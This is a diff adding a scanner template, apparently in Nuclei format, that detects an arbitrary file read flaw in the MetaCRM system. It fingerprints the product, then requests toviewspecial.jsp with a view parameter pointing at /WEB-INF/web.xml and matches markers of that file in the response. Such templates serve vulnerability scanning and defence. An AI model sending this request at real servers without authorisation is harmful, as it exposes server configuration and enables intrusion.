@@ -1,0 +1,33 @@
+id: poc-yaml-metacrm-toviewspecial-jsp-anyfile-read
+info:
+  name: MetaCRM Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,metacrm
+  description: |
+    MetaCRM customer relationship management system is vulnerable to an arbitrary file read vulnerability via the `toviewspecial.jsp` endpoint.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/indexbusiness.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "MetaCRM"
+  - method: GET
+    path:
+      - "{{BaseURL}}/business/common/toviewspecial.jsp?view=/WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "</meta>"
+          - "</web-app>"
+          - "<servlet-name>"
